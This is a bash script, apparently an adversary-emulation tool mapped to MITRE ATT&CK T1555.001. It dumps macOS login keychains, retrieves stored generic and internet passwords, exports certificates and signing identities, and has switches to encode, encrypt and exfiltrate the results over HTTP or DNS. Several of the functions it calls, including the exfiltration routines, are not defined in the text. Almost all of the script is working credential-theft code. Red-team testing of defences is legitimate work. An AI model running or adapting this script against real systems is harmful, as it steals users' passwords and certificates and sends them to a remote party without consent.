
# Script Name: keychain.sh
# MITRE ATT&CK Technique: T1555.001
# Author: Daniel A. | github.com/darmado | x.com/darmad0
# Date: 2024-10-12
# Version: 1.0

# Description:
# Extract credentials stored in macOS keychains with MacOS native tools. 

# References:
# - https://attack.mitre.org/techniques/T1555/001/
# - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.001/T1555.001.md

# MITRE ATT&CK Reference var map
TACTIC="Credential Access"
TTP_ID="T1555.001"

TACTIC_EXFIL="Exfiltration"
TTP_ID_EXFIL="T1041"

TACTIC_ENCRYPT="Defense Evasion"
TTP_ID_ENCRYPT="T1027"

TACTIC_ENCODE="Defense Evasion"
TTP_ID_ENCODE="T1140"

TTP_ID_ENCODE_BASE64="T1027.001"
TTP_ID_ENCODE_STEGANOGRAPHY="T1027.003"
TTP_ID_ENCODE_PERL="T1059.006"

# Script metadata 
NAME="keychain"

# Global Control Switches
SUDO_MODE=false
VERBOSE=false
DEBUG=false
ALL=false

# Output Control Switches
LOG_ENABLED=false
ENCODE="none"
ENCRYPT="none"
OUTPUT_JSON=false

# Exfiltration Control Switches
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""

# Security Check Switches
CHECK_EDR=false
CHECK_AV=false
CHECK_FIREWALL=false
CHECK_MRT=false
CHECK_GATEKEEPER=false
CHECK_XPROTECT=false
CHECK_TCC=false
CHECK_OST=false
CHECK_HIDS=false

# Logging Configuration
LOG_DIR="../../logs"
LOG_FILE_NAME="${TTP_ID}_${NAME}.log"
LOG_FILE="${LOG_DIR}/${LOG_FILE_NAME}"

# Input Variables with Defaults
INPUT_ACCOUNT=""
INPUT_SERVICE=""
INPUT_SERVER=""
INPUT_OUTPUT_FILE=""
INPUT_CHUNK_SIZE=1000
INPUT_TIMEOUT=10
INPUT_RATE_LIMIT=0.5
INPUT_FORMAT="raw"

# Command Variables (use full paths for critical commands)
CMD_SECURITY="/usr/bin/security"
CMD_SQLITE3="/usr/bin/sqlite3"
CMD_STRINGS="/usr/bin/strings"
CMD_OPENSSL="/usr/bin/openssl"
CMD_BASE64="/usr/bin/base64"
CMD_XXD="/usr/bin/xxd"
CMD_CURL="/usr/bin/curl"
CMD_DIG="/usr/bin/dig"

# Command Map
declare -A COMMANDS=(
    ["dump_keychain"]="$CMD_SECURITY dump-keychain login.keychain"
    ["find_generic"]="$CMD_SECURITY find-generic-password -a \"\$INPUT_ACCOUNT\" -s \"\$INPUT_SERVICE\""
    ["find_internet"]="$CMD_SECURITY find-internet-password -a \"\$INPUT_ACCOUNT\" -s \"\$INPUT_SERVER\""
    ["find_cert"]="$CMD_SECURITY find-certificate -a -p"
    ["unlock_keychain"]="$CMD_SECURITY unlock-keychain login.keychain"
    ["export_items"]="$CMD_SECURITY export -k login.keychain -t certs -f pem -o \"\$INPUT_OUTPUT_FILE\""
    ["find_identity"]="$CMD_SECURITY find-identity -v -p codesigning"
    ["strings_keychain"]="$CMD_STRINGS ~/Library/Keychains/login.keychain-db"
)

# Utility Functions

#FunctionType: utility
validate_sudo_mode() {
    if [ "$SUDO_MODE" = true ] && [ "$(id -u)" != "0" ]; then
        echo "Error: Root privileges required. Please run with sudo." >&2
        return 1
    fi
    return 0
}

#FunctionType: utility
get_timestamp() {
    date +"%Y-%m-%d %H:%M:%S"
}

#FunctionType: utility
log_to_stdout() {
    local msg="$1"
    local function_name="$2"
    local command="$3"
    local timestamp=$(get_timestamp)
    local log_entry="[${timestamp}]: user: $USER; ttp_id: $TTP_ID; tactic: $TACTIC; msg: $msg; function: $function_name; command: \"$command\""
    
    echo "$log_entry"
    
    if [ "$LOG_ENABLED" = true ]; then
        echo "$log_entry" >> "$LOG_FILE"
    fi
}

#FunctionType: utility
create_log() {
    if [ ! -d "$LOG_DIR" ]; then
        mkdir -p "$LOG_DIR"
    fi
    touch "$LOG_FILE"
    chmod 600 "$LOG_FILE"
}

#FunctionType: utility
log_output() {
    local output="$1"
    local max_size=$((5 * 1024 * 1024))  # 5MB in bytes
    
    if [ ! -f "$LOG_FILE" ] || [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        create_log
    fi
    
    echo "$output" >> "$LOG_FILE"
    
    # Rotate log if it exceeds 5MB
    if [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        mv "$LOG_FILE" "${LOG_FILE}.old"
        create_log
    fi
}

#FunctionType: utility
validate_input() {
    local input="$1"
    local input_type="$2"
    
    case "$input_type" in
        "account")
            if [[ ! "$input" =~ ^[a-zA-Z0-9._-]+$ ]]; then
                log_to_stdout "Invalid account name: $input" "validate_input" ""
                return 1
            fi
            ;;
        "service")
            if [[ ! "$input" =~ ^[a-zA-Z0-9._-]+$ ]]; then
                log_to_stdout "Invalid service name: $input" "validate_input" ""
                return 1
            fi
            ;;
        "server")
            if [[ ! "$input" =~ ^[a-zA-Z0-9._-]+$ ]]; then
                log_to_stdout "Invalid server name: $input" "validate_input" ""
                return 1
            fi
            ;;
        "file")
            if [[ ! "$input" =~ ^[a-zA-Z0-9._/-]+$ ]]; then
                log_to_stdout "Invalid file path: $input" "validate_input" ""
                return 1
            fi
            ;;
    esac
    return 0
}

#FunctionType: credential_access
dump_keychain() {
    log_to_stdout "Attempting to dump keychain" "dump_keychain" "${COMMANDS[dump_keychain]}"
    eval "${COMMANDS[dump_keychain]}"
}

#FunctionType: credential_access
find_generic_password() {
    if [ -n "$INPUT_ACCOUNT" ] && [ -n "$INPUT_SERVICE" ]; then
        if ! validate_input "$INPUT_ACCOUNT" "account" || ! validate_input "$INPUT_SERVICE" "service"; then
            return 1
        fi
        log_to_stdout "Searching for generic password" "find_generic_password" "${COMMANDS[find_generic]}"
        eval "${COMMANDS[find_generic]}"
    else
        log_to_stdout "Account and service required for generic password search" "find_generic_password" ""
        return 1
    fi
}

#FunctionType: credential_access
find_internet_password() {
    if [ -n "$INPUT_ACCOUNT" ] && [ -n "$INPUT_SERVER" ]; then
        if ! validate_input "$INPUT_ACCOUNT" "account" || ! validate_input "$INPUT_SERVER" "server"; then
            return 1
        fi
        log_to_stdout "Searching for internet password" "find_internet_password" "${COMMANDS[find_internet]}"
        eval "${COMMANDS[find_internet]}"
    else
        log_to_stdout "Account and server required for internet password search" "find_internet_password" ""
        return 1
    fi
}

#FunctionType: credential_access
find_certificates() {
    log_to_stdout "Searching for certificates" "find_certificates" "${COMMANDS[find_cert]}"
    eval "${COMMANDS[find_cert]}"
}

#FunctionType: credential_access
unlock_keychain() {
    log_to_stdout "Attempting to unlock keychain" "unlock_keychain" "${COMMANDS[unlock_keychain]}"
    eval "${COMMANDS[unlock_keychain]}"
}

#FunctionType: credential_access
export_items() {
    if [ -n "$INPUT_OUTPUT_FILE" ]; then
        if ! validate_input "$INPUT_OUTPUT_FILE" "file"; then
            return 1
        fi
        log_to_stdout "Exporting keychain items" "export_items" "${COMMANDS[export_items]}"
        eval "${COMMANDS[export_items]}"
    else
        log_to_stdout "Output file required for export" "export_items" ""
        return 1
    fi
}

#FunctionType: credential_access
find_identity() {
    log_to_stdout "Searching for code signing identities" "find_identity" "${COMMANDS[find_identity]}"
    eval "${COMMANDS[find_identity]}"
}

#FunctionType: credential_access
strings_keychain() {
    log_to_stdout "Extracting strings from keychain" "strings_keychain" "${COMMANDS[strings_keychain]}"
    eval "${COMMANDS[strings_keychain]}"
}

# Main function
main() {
    # Validate sudo mode first if required
    if ! validate_sudo_mode; then
        exit 1
    fi

    # Initialize logging if enabled
    if [ "$LOG_ENABLED" = true ]; then
        create_log
    fi

    local output=""
    local processed_output=""

    # Execute credential access functions based on switches
    if [ "$ALL" = true ]; then
        output+="$(dump_keychain)\n"
        output+="$(find_certificates)\n"
        output+="$(find_identity)\n"
        output+="$(strings_keychain)\n"
    else
        if [ -n "$INPUT_ACCOUNT" ] && [ -n "$INPUT_SERVICE" ]; then
            output+="$(find_generic_password)\n"
        fi
        if [ -n "$INPUT_ACCOUNT" ] && [ -n "$INPUT_SERVER" ]; then
            output+="$(find_internet_password)\n"
        fi
        if [ -n "$INPUT_OUTPUT_FILE" ]; then
            output+="$(export_items)\n"
        fi
    fi

    # Process output
    if [ "$ENCODE" != "none" ]; then
        processed_output=$(encode_output "$output")
    fi

    if [ "$ENCRYPT" != "none" ]; then
        processed_output=$(encrypt_output "${processed_output:-$output}")
    fi

    # Handle output based on settings
    if [ "$LOG_ENABLED" = true ]; then
        log_output "${processed_output:-$output}"
    fi

    if [ "$EXFIL" = true ]; then
        if [ "$EXFIL_METHOD" = "dns" ]; then
            exfiltrate_dns "${processed_output:-$output}" "$EXFIL_URI"
        else
            exfiltrate_http "${processed_output:-$output}" "$EXFIL_URI"
        fi
    else
        echo "${processed_output:-$output}"
    fi
}

# Parse command line arguments
while [ "$#" -gt 0 ]; do
    case "$1" in
        -h|--help) display_help; exit 0 ;;
        -v|--verbose) VERBOSE=true ;;
        -d|--debug) DEBUG=true ;;
        -l|--log) LOG_ENABLED=true ;;
        -a|--all) ALL=true ;;
        --sudo) SUDO_MODE=true ;;
        -j|--json) OUTPUT_JSON=true ;;
        -e|--encode)
            shift
            ENCODE="$1"
            ;;
        -E|--encrypt)
            shift
            ENCRYPT="$1"
            ENCRYPT_KEY=$($CMD_OPENSSL rand -base64 32)
            ;;
        --exfil=*)
            EXFIL=true
            EXFIL_URI="${1#*=}"
            if [[ "$EXFIL_URI" == dns=* ]]; then
                EXFIL_METHOD="dns"
                EXFIL_URI="${EXFIL_URI#dns=}"
            else
                EXFIL_METHOD="http"
            fi
            ;;
        -c|--chunksize)
            shift
            INPUT_CHUNK_SIZE="$1"
            ;;
        --account=*)
            INPUT_ACCOUNT="${1#*=}"
            ;;
        --service=*)
            INPUT_SERVICE="${1#*=}"
            ;;
        --server=*)
            INPUT_SERVER="${1#*=}"
            ;;
        --output=*)
            INPUT_OUTPUT_FILE="${1#*=}"
            ;;
        *) echo "Unknown option: $1" >&2; display_help; exit 1 ;;
    esac
    shift
done

# Execute main function
main
